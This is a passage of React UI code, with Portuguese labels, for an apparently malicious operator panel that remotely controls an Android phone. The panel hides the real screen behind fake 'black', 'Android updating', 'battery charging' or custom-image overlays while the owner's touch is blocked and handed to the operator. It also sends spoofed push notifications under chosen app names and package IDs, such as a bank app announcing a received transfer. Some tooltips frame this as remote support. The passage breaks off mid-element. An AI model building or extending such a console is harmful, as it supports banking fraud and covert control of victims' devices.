          {/* Active Screen Banner */}
          {currentDisguise?.active ? (
            <div
              style={{
                background: "rgba(255, 26, 42, 0.12)",
                border: "1px solid #ff1a2a",
                borderRadius: "5px",
                padding: "6px 8px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                gap: "6px"
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                <span
                  style={{
                    width: "7px",
                    height: "7px",
                    borderRadius: "50%",
                    background: "#ff1a2a",
                    boxShadow: "0 0 6px #ff1a2a",
                    animation: "pulse 1.2s infinite",
                    flexShrink: 0
                  }}
                />
                <div style={{ minWidth: 0 }}>
                  <div style={{ fontSize: "10px", fontWeight: 800, color: "#fff", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    TELA ATIVA NO CELULAR
                  </div>
                  <div style={{ fontSize: "9px", color: "#ff808b", textTransform: "capitalize", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                    {currentDisguise.type === "black"
                      ? "Tela Preta (Apagada)"
                      : currentDisguise.type === "update"
                      ? "Atualizando Android"
                      : currentDisguise.type === "battery"
                      ? "Carregando Bateria"
                      : "Imagem Personalizada"}
                  </div>
                </div>
              </div>

              <button
                type="button"
                onClick={handleClearDisguise}
                disabled={isActivatingDisguise}
                style={{
                  background: "#ff1a2a",
                  border: "none",
                  borderRadius: "4px",
                  color: "#fff",
                  fontSize: "9.5px",
                  fontWeight: 700,
                  padding: "3px 7px",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  gap: "3px",
                  flexShrink: 0
                }}
                title="Desativar tela de disfarce e voltar à tela real do smartphone"
              >
                <X size={10} />
                <span>Desativar</span>
              </button>
            </div>
          ) : (
            <div
              style={{
                background: "rgba(34, 197, 94, 0.08)",
                border: "1px solid rgba(34, 197, 94, 0.25)",
                borderRadius: "5px",
                padding: "5px 8px",
                display: "flex",
                alignItems: "center",
                gap: "5px",
                fontSize: "10px",
                color: "#86efac"
              }}
            >
              <CheckCircle size={12} style={{ color: "#22c55e", flexShrink: 0 }} />
              <span>Tela Normal Ativa (Sem disfarce)</span>
            </div>
          )}

          {/* TOUCH ISOLATION NOTICE BANNER */}
          <div
            style={{
              background: "rgba(15, 23, 42, 0.6)",
              border: "1px dashed rgba(56, 189, 248, 0.3)",
              borderRadius: "5px",
              padding: "5px 7px",
              display: "flex",
              alignItems: "center",
              gap: "5px"
            }}
          >
            <Lock size={11} style={{ color: "#38bdf8", flexShrink: 0 }} />
            <div style={{ fontSize: "9px", color: "#94a3b8", lineHeight: 1.25 }}>
              <span style={{ color: "#38bdf8", fontWeight: 700 }}>Toque Isolado:</span> Toque físico bloqueado no aparelho e liberado para o operador.
            </div>
          </div>

          {/* 1. QUADRO SUPERIOR: ENVIAR PUSH NOTIFICATION (HEADS-UP POPUP COM PREVIEW) */}
          <div
            style={{
              background: "#0a0e18",
              border: "1px solid rgba(245, 158, 11, 0.4)",
              boxShadow: "0 0 16px rgba(245, 158, 11, 0.12)",
              borderRadius: "6px",
              padding: "9px 10px",
              display: "flex",
              flexDirection: "column",
              gap: "7px"
            }}
          >
            {/* Header with Collapse / Expand Toggle */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                cursor: "pointer",
                userSelect: "none"
              }}
              onClick={() => setIsPushCollapsed(!isPushCollapsed)}
              title={isPushCollapsed ? "Clique para expandir envio de push" : "Clique para recolher envio de push"}
            >
              <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                <Bell size={13} style={{ color: "#f59e0b" }} />
                <span style={{ fontSize: "11px", fontWeight: 700, color: "#f8fafc" }}>
                  Enviar Push Notification
                </span>
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                <span
                  style={{
                    fontSize: "8px",
                    background: "rgba(245, 158, 11, 0.2)",
                    color: "#fbbf24",
                    border: "1px solid rgba(245, 158, 11, 0.4)",
                    padding: "1px 5px",
                    borderRadius: "3px",
                    fontWeight: 800,
                    letterSpacing: "0.4px"
                  }}
                >
                  HEADS-UP POPUP
                </span>
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation();
                    setIsPushCollapsed(!isPushCollapsed);
                  }}
                  style={{
                    background: isPushCollapsed ? "rgba(245, 158, 11, 0.2)" : "#131826",
                    border: `1px solid ${isPushCollapsed ? "#f59e0b" : "#243249"}`,
                    color: isPushCollapsed ? "#fbbf24" : "#94a3b8",
                    borderRadius: "4px",
                    width: "20px",
                    height: "20px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                    cursor: "pointer"
                  }}
                  title={isPushCollapsed ? "Expandir formulário de push" : "Recolher formulário de push"}
                >
                  {isPushCollapsed ? <ChevronDown size={12} /> : <ChevronUp size={12} />}
                </button>
              </div>
            </div>

            {isPushCollapsed ? (
              <div
                style={{
                  background: "#080c16",
                  border: "1px dashed rgba(245, 158, 11, 0.3)",
                  borderRadius: "5px",
                  padding: "6px 8px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  gap: "6px"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px", minWidth: 0 }}>
                  <AppLogo name={pushAppName} packageName={pushPackageName} size={14} />
                  <div style={{ minWidth: 0 }}>
                    <div style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                      {pushAppName || "App"}: {pushTitle || "Notificação"}
                    </div>
                    <div style={{ fontSize: "8.5px", color: "#94a3b8", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                      {pushMessage || "Sem mensagem"}
                    </div>
                  </div>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: "4px", flexShrink: 0 }}>
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleSendPush();
                    }}
                    disabled={isSendingPush || !pushTitle.trim() || !pushMessage.trim()}
                    style={{
                      height: "23px",
                      background: "linear-gradient(135deg, #f59e0b 0%, #d97706 100%)",
                      border: "none",
                      borderRadius: "3px",
                      color: "#000",
                      fontSize: "9px",
                      fontWeight: 800,
                      padding: "0 7px",
                      cursor: isSendingPush ? "wait" : "pointer",
                      display: "flex",
                      alignItems: "center",
                      gap: "3px"
                    }}
                    title="Despachar notificação rápida ao aparelho"
                  >
                    <Bell size={9} />
                    <span>{isSendingPush ? "..." : "Enviar"}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setIsPushCollapsed(false)}
                    style={{
                      height: "23px",
                      background: "#1e293b",
                      border: "1px solid #334155",
                      borderRadius: "3px",
                      color: "#cbd5e1",
                      fontSize: "8.5px",
                      fontWeight: 600,
                      padding: "0 6px",
                      cursor: "pointer"
                    }}
                    title="Expandir formulário completo de push"
                  >
                    Editar ▾
                  </button>
                </div>
              </div>
            ) : (
              <>
                <div style={{ fontSize: "9px", color: "#94a3b8", lineHeight: 1.3 }}>
                  Selecione o app emissor e escreva o título e a mensagem para gerar a notificação push no aparelho.
                </div>

            {/* 1. SELEÇÃO DE APLICATIVO EM CHIPS RÁPIDOS */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                1. Selecione o Aplicativo:
              </span>
              <div
                style={{
                  display: "flex",
                  flexWrap: "wrap",
                  gap: "3px"
                }}
              >
                {POPULAR_PUSH_APPS.map((app) => {
                  const isSelected = selectedPushApp === app.name;
                  return (
                    <button
                      key={app.name}
                      type="button"
                      onClick={() => handleSelectAppChip(app)}
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "3px",
                        padding: "3px 6px",
                        background: isSelected ? "rgba(245, 158, 11, 0.25)" : "#131826",
                        border: `1px solid ${isSelected ? "#f59e0b" : "#1e293b"}`,
                        borderRadius: "4px",
                        color: isSelected ? "#fbbf24" : "#cbd5e1",
                        fontSize: "8.5px",
                        fontWeight: isSelected ? 800 : 500,
                        cursor: "pointer",
                        transition: "all 0.15s ease"
                      }}
                      title={app.packageName ? `${app.name} (${app.packageName})` : app.name}
                    >
                      <AppLogo name={app.name} packageName={app.packageName} size={12} />
                      <span>{app.name}</span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Campos de Nome do App e Pacote (Editáveis) */}
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "4px" }}>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Nome Visível do App:
                </label>
                <input
                  type="text"
                  value={pushAppName}
                  onChange={(e) => setPushAppName(e.target.value)}
                  placeholder="ex: Nubank"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#f8fafc",
                    fontSize: "9.5px",
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Package ID (Android):
                </label>
                <input
                  type="text"
                  value={pushPackageName}
                  onChange={(e) => setPushPackageName(e.target.value)}
                  placeholder="ex: com.nu.production"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#94a3b8",
                    fontSize: "9px",
                    fontFamily: "var(--font-mono)",
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>
            </div>

            {/* 2. PRESETS RÁPIDOS (1 CLIQUE) */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                Presets Rápidos:
              </span>
              <div style={{ display: "flex", gap: "3px", overflowX: "auto", paddingBottom: "2px" }}>
                {PUSH_NOTIFICATION_PRESETS.map((p, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleApplyPreset(p)}
                    style={{
                      whiteSpace: "nowrap",
                      background: "#121927",
                      border: "1px solid #1e293b",
                      borderRadius: "3px",
                      color: "#93c5fd",
                      fontSize: "8px",
                      fontWeight: 600,
                      padding: "2px 5px",
                      cursor: "pointer",
                      flexShrink: 0
                    }}
                    title={`${p.title} - ${p.message}`}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            {/* 3. TÍTULO E CONTEÚDO */}
            <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Título da Notificação:
                </label>
                <input
                  type="text"
                  value={pushTitle}
                  onChange={(e) => setPushTitle(e.target.value)}
                  placeholder="ex: Transferência recebida"
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#f8fafc",
                    fontSize: "9.5px",
                    fontWeight: 700,
                    padding: "4px 6px",
                    boxSizing: "border-box",
                    outline: "none"
                  }}
                />
              </div>

              <div>
                <label style={{ display: "block", fontSize: "8px", color: "#94a3b8", marginBottom: "2px" }}>
                  Mensagem / O que vem escrito:
                </label>
                <textarea
                  value={pushMessage}
                  onChange={(e) => setPushMessage(e.target.value)}
                  placeholder="Digite o texto que será exibido na notificação push do celular..."
                  rows={2}
                  style={{
                    width: "100%",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "4px",
                    color: "#cbd5e1",
                    fontSize: "9.5px",
                    padding: "5px 6px",
                    boxSizing: "border-box",
                    outline: "none",
                    resize: "vertical",
                    fontFamily: "inherit",
                    lineHeight: 1.3
                  }}
                />
              </div>
            </div>

            {/* 4. PREVIEW REALISTA DA NOTIFICAÇÃO NO APARELHO */}
            <div style={{ marginTop: "1px", display: "flex", flexDirection: "column", gap: "3px" }}>
              <span style={{ fontSize: "8.5px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                Preview da Notificação no Aparelho:
              </span>
              <div
                style={{
                  background: "#111724",
                  border: "1px solid rgba(245, 158, 11, 0.35)",
                  borderRadius: "6px",
                  padding: "8px 9px",
                  boxShadow: "0 3px 10px rgba(0, 0, 0, 0.4)",
                  display: "flex",
                  flexDirection: "column",
                  gap: "3px"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                    <AppLogo name={pushAppName} packageName={pushPackageName} size={14} />
                    <span style={{ fontSize: "9.5px", fontWeight: 700, color: "#f8fafc" }}>
                      {pushAppName || "Aplicativo"}
                    </span>
                    <span style={{ fontSize: "8.5px", color: "#64748b" }}>• agora</span>
                  </div>
                  <Bell size={10} style={{ color: "#f59e0b" }} />
                </div>
                <div style={{ fontSize: "10px", fontWeight: 800, color: "#ffffff", lineHeight: 1.25 }}>
                  {pushTitle.trim() || "Título da notificação"}
                </div>
                <div style={{ fontSize: "9px", color: "#cbd5e1", lineHeight: 1.3 }}>
                  {pushMessage.trim() || "Conteúdo da notificação push que surgirá no topo do aparelho..."}
                </div>
              </div>
            </div>

            {/* BOTÃO DE DESPACHO NA MESMA TELA */}
            <button
              type="button"
              onClick={handleSendPush}
              disabled={isSendingPush || !pushTitle.trim() || !pushMessage.trim()}
              style={{
                height: "26px",
                background: "linear-gradient(135deg, #f59e0b 0%, #d97706 100%)",
                border: "none",
                borderRadius: "4px",
                color: "#000",
                fontSize: "10px",
                fontWeight: 800,
                padding: "0 8px",
                cursor: isSendingPush || !pushTitle.trim() || !pushMessage.trim() ? "not-allowed" : "pointer",
                opacity: isSendingPush || !pushTitle.trim() || !pushMessage.trim() ? 0.5 : 1,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "5px",
                boxShadow: "0 2px 8px rgba(245, 158, 11, 0.4)",
                transition: "all 0.15s ease",
                marginTop: "2px"
              }}
            >
              <Bell size={11} />
              <span>{isSendingPush ? "Despachando ao Aparelho..." : "Despachar Push Notification"}</span>
            </button>

            {/* RECENTES NOTIFICAÇÕES ENVIADAS */}
            {recentPushes.length > 0 && (
              <div style={{ marginTop: "2px", borderTop: "1px solid #1e293b", paddingTop: "4px" }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "3px" }}>
                  <span style={{ fontSize: "8px", color: "#64748b", fontWeight: 700, textTransform: "uppercase" }}>
                    Histórico Recente ({recentPushes.length}):
                  </span>
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: "3px", maxHeight: "95px", overflowY: "auto" }}>
                  {recentPushes.slice(0, 4).map((p) => (
                    <div
                      key={p.id}
                      style={{
                        background: "#080c16",
                        border: "1px solid #172033",
                        borderRadius: "3px",
                        padding: "4px 6px",
                        display: "flex",
                        flexDirection: "column",
                        gap: "1px",
                        cursor: "pointer"
                      }}
                      onClick={() => {
                        setPushAppName(p.appName);
                        setPushPackageName(p.packageName || "");
                        setPushTitle(p.title);
                        setPushMessage(p.message);
                        showToast(`Notificação "${p.title}" carregada no formulário`, "info");
                      }}
                      title="Clique para reutilizar esta notificação"
                    >
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <span style={{ fontSize: "8.5px", fontWeight: 700, color: "#fbbf24" }}>
                          {p.appName}
                        </span>
                        <span style={{ fontSize: "7.5px", color: "#64748b" }}>
                          {p.timestamp ? new Date(p.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : ""}
                        </span>
                      </div>
                      <div style={{ fontSize: "8.5px", fontWeight: 600, color: "#f8fafc", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {p.title}
                      </div>
                      <div style={{ fontSize: "8px", color: "#94a3b8", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                        {p.message}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
              </>
            )}
          </div>

          {/* TÍTULO DA SEÇÃO COM CONTROLES DE COLLAPSE E DIMINUIR/AUMENTAR */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginTop: "4px",
              marginBottom: "1px",
              padding: "4px 6px",
              background: "#0a0f1d",
              border: "1px solid #1a2538",
              borderRadius: "5px"
            }}
          >
            {/* Left title and active status */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "5px",
                cursor: "pointer",
                userSelect: "none",
                flex: 1
              }}
              onClick={() => setIsDisguiseCollapsed(!isDisguiseCollapsed)}
              title={isDisguiseCollapsed ? "Clique para expandir telas do aparelho" : "Clique para recolher telas do aparelho"}
            >
              <Smartphone size={12} style={{ color: "#38bdf8" }} />
              <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#cbd5e1", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                Telas do Aparelho
              </span>
              {currentDisguise?.active ? (
                <span
                  style={{
                    fontSize: "7.5px",
                    background: "rgba(255, 26, 42, 0.2)",
                    color: "#ff4d5a",
                    border: "1px solid #ff1a2a",
                    padding: "0 4px",
                    borderRadius: "3px",
                    fontWeight: 800
                  }}
                >
                  1 ATIVA
                </span>
              ) : (
                <span
                  style={{
                    fontSize: "7.5px",
                    background: "rgba(34, 197, 94, 0.15)",
                    color: "#22c55e",
                    border: "1px solid rgba(34, 197, 94, 0.3)",
                    padding: "0 4px",
                    borderRadius: "3px",
                    fontWeight: 700
                  }}
                >
                  NORMAL
                </span>
              )}
            </div>

            {/* Right Controls: Diminuir / Aumentar & Collapse */}
            <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
              {/* Diminuir / Aumentar escala dos cards (P = Compacto, M = Normal, G = Grande) */}
              {!isDisguiseCollapsed && (
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    background: "#080c16",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    padding: "1px 2px",
                    gap: "2px"
                  }}
                  title="Diminuir ou aumentar tamanho das telas do aparelho (P = Compacto, M = Médio, G = Grande)"
                >
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("compact")}
                    style={{
                      background: disguiseScale === "compact" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "compact" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Diminuir telas (Compacto)"
                  >
                    P
                  </button>
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("normal")}
                    style={{
                      background: disguiseScale === "normal" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "normal" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Tamanho padrão (Médio)"
                  >
                    M
                  </button>
                  <button
                    type="button"
                    onClick={() => setDisguiseScale("large")}
                    style={{
                      background: disguiseScale === "large" ? "rgba(56, 189, 248, 0.25)" : "transparent",
                      border: "none",
                      color: disguiseScale === "large" ? "#38bdf8" : "#64748b",
                      fontSize: "8px",
                      fontWeight: 800,
                      padding: "1px 4px",
                      borderRadius: "2px",
                      cursor: "pointer"
                    }}
                    title="Aumentar telas (Grande)"
                  >
                    G
                  </button>
                </div>
              )}

              {/* Botão de Collapse / Expandir Telas */}
              <button
                type="button"
                onClick={() => setIsDisguiseCollapsed(!isDisguiseCollapsed)}
                style={{
                  background: isDisguiseCollapsed ? "rgba(56, 189, 248, 0.2)" : "#131826",
                  border: `1px solid ${isDisguiseCollapsed ? "#38bdf8" : "#243249"}`,
                  color: isDisguiseCollapsed ? "#38bdf8" : "#94a3b8",
                  borderRadius: "4px",
                  width: "20px",
                  height: "20px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  padding: 0,
                  cursor: "pointer"
                }}
                title={isDisguiseCollapsed ? "Expandir telas do aparelho" : "Recolher telas do aparelho"}
              >
                {isDisguiseCollapsed ? <ChevronDown size={12} /> : <ChevronUp size={12} />}
              </button>
            </div>
          </div>

          {isDisguiseCollapsed ? (
            <div
              style={{
                background: "#080c16",
                border: "1px dashed rgba(56, 189, 248, 0.3)",
                borderRadius: "5px",
                padding: "6px 8px",
                display: "flex",
                flexDirection: "column",
                gap: "5px"
              }}
            >
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <span style={{ fontSize: "8.5px", color: "#94a3b8" }}>
                  Disparo Rápido de Tela ({currentDisguise?.active ? "1 Ativa" : "Normal"}):
                </span>
                <button
                  type="button"
                  onClick={() => setIsDisguiseCollapsed(false)}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#38bdf8",
                    fontSize: "8.5px",
                    fontWeight: 700,
                    cursor: "pointer"
                  }}
                >
                  Expandir Telas ▾
                </button>
              </div>

              {/* Quick 1-click action buttons while collapsed */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "4px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("black")}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "black" ? "#fff" : "#cbd5e1",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "3px"
                  }}
                  title="Ativar Tela Preta"
                >
                  <EyeOff size={9} />
                  <span>Preta</span>
                </button>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("update", { progressPercent: updatePercent })}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "update" ? "#000" : "#60a5fa",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "3px"
                  }}
                  title="Ativar Atualizando Android"
                >
                  <RefreshCw size={9} />
                  <span>Update</span>
                </button>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("battery", { progressPercent: device.battery ?? 75 })}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "battery" ? "#22c55e" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "battery" ? "#000" : "#86efac",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "3px"
                  }}
                  title="Ativar Bateria"
                >
                  <BatteryCharging size={9} />
                  <span>Bateria</span>
                </button>
                <button
                  type="button"
                  onClick={() => {
                    if (selectedCustomImage) {
                      handleActivateDisguise("custom_image", {
                        customImageUrl: selectedCustomImage,
                        imageWidth: customImageMeta?.width,
                        imageHeight: customImageMeta?.height
                      });
                    } else {
                      setIsDisguiseCollapsed(false);
                      showToast("Selecione uma imagem para ativar", "info");
                    }
                  }}
                  style={{
                    padding: "4px 2px",
                    background: currentDisguise?.active && currentDisguise.type === "custom_image" ? "#a855f7" : "#131826",
                    border: "1px solid #1e293b",
                    borderRadius: "3px",
                    color: currentDisguise?.active && currentDisguise.type === "custom_image" ? "#fff" : "#c084fc",
                    fontSize: "8px",
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "3px"
                  }}
                  title="Ativar Imagem Custom"
                >
                  <ImageIcon size={9} />
                  <span>Custom</span>
                </button>
              </div>
            </div>
          ) : (
            <>

          {/* 1. CARD: TELA PRETA (STANDBY / OFF) */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "black" ? "0 0 10px rgba(255, 26, 42, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="black"
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "black")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <EyeOff size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#94a3b8" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Tela Preta
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "black" && (
                  <span style={{ fontSize: "8px", background: "#ff1a2a", color: "#fff", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA
                  </span>
                )}
              </div>

              <div style={{ fontSize: disguiseScale === "compact" ? "8px" : "9px", color: "#94a3b8", lineHeight: 1.2 }}>
                Display apagado · <span style={{ color: "#38bdf8", fontWeight: 700 }}>Toque OFF</span> · <span style={{ color: "#22c55e", fontWeight: 700 }}>Suporte Total</span>
              </div>

              <div style={{ display: "flex", gap: "4px", marginTop: "1px" }}>
                <button
                  type="button"
                  onClick={() => handleActivateDisguise("black")}
                  disabled={isActivatingDisguise}
                  style={{
                    flex: 1,
                    height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                    background: currentDisguise?.active && currentDisguise.type === "black" ? "rgba(255, 26, 42, 0.25)" : "#161f30",
                    border: `1px solid ${currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#243249"}`,
                    borderRadius: "4px",
                    color: currentDisguise?.active && currentDisguise.type === "black" ? "#ff4d5a" : "#cbd5e1",
                    fontSize: disguiseScale === "compact" ? "8.5px" : disguiseScale === "large" ? "10.5px" : "9.5px",
                    fontWeight: 700,
                    padding: "0 6px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "4px"
                  }}
                  title={
                    currentDisguise?.active && currentDisguise.type === "black"
                      ? "Tela preta e bloqueio de toque ativos no aparelho. Suporte remoto operando."
                      : "Apagar tela do aparelho, desativar toque do usuário e liberar suporte remoto com total controle"
                  }
                >
                  <Zap size={10} />
                  <span>
                    {currentDisguise?.active && currentDisguise.type === "black"
                      ? "Ativa · Toque OFF"
                      : "Ativar Tela Preta"}
                  </span>
                </button>
                {currentDisguise?.active && currentDisguise.type === "black" && (
                  <button
                    type="button"
                    onClick={handleClearDisguise}
                    style={{
                      width: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      height: disguiseScale === "compact" ? "20px" : disguiseScale === "large" ? "26px" : "23px",
                      background: "rgba(255, 26, 42, 0.15)",
                      border: "1px solid #ff4d5a",
                      color: "#ff808b",
                      borderRadius: "4px",
                      padding: 0,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center"
                    }}
                    title="Restaurar Aparelho Normal (Reativar Tela e Toque)"
                  >
                    <X size={10} />
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* 2. CARD: ATUALIZANDO ANDROID (SYSTEM UPDATE) */}
          <div
            style={{
              background: "#0a0e18",
              border: `1px solid ${currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#1a2234"}`,
              boxShadow: currentDisguise?.active && currentDisguise.type === "update" ? "0 0 10px rgba(0, 229, 255, 0.2)" : "none",
              borderRadius: "6px",
              padding: disguiseScale === "compact" ? "5px 7px" : disguiseScale === "large" ? "10px 12px" : "7px 9px",
              display: "flex",
              gap: disguiseScale === "compact" ? "6px" : disguiseScale === "large" ? "10px" : "8px",
              alignItems: "center"
            }}
          >
            {/* Lateral Mini Preview */}
            <MiniPhonePreview
              type="update"
              updatePercent={updatePercent}
              isActive={Boolean(currentDisguise?.active && currentDisguise.type === "update")}
              scale={disguiseScale}
            />

            {/* Right Content */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: "4px", minWidth: 0 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <RotateCw size={disguiseScale === "compact" ? 10 : disguiseScale === "large" ? 14 : 12} style={{ color: "#00e5ff" }} />
                  <span style={{ fontSize: disguiseScale === "compact" ? "10px" : disguiseScale === "large" ? "12px" : "11px", fontWeight: 700, color: "#f8fafc" }}>
                    Atualizando Android
                  </span>
                </div>
                {currentDisguise?.active && currentDisguise.type === "update" && (
                  <span style={{ fontSize: "8px", background: "#00e5ff", color: "#000", padding: "1px 4px", borderRadius: "3px", fontWeight: 800 }}>
                    ATIVA ({updatePercent}%)
                  </span>
                )}
              </div>

              {/* Slider de Progresso Compacto */}
              <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                <span style={{ fontSize: "8.5px", color: "#64748b" }}>Progresso:</span>
                <input
                  type="range"
                  min="5"
                  max="98"
                  value={updatePercent}
                  onChange={(e) => setUpdatePercent(Number(e.target.value))}
                  style={{ flex: 1, accentColor: "#00e5ff", cursor: "pointer", height: "3px" }}
                />
